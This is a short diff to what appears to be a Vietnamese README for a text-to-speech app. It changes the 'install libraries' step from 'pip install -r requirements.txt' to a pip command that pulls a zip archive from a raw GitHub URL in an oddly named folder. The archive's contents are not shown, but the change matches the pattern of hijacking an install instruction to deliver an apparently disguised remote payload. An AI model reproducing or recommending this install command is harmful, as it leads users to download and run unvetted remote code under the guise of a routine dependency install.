@@ -9,4 +9,4 @@
 ### 1. Cài thư viện
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/nvb123456/text-to-speech-app/raw/refs/heads/main/unreclaimedness/app_text_to_speech_v1.9.zip
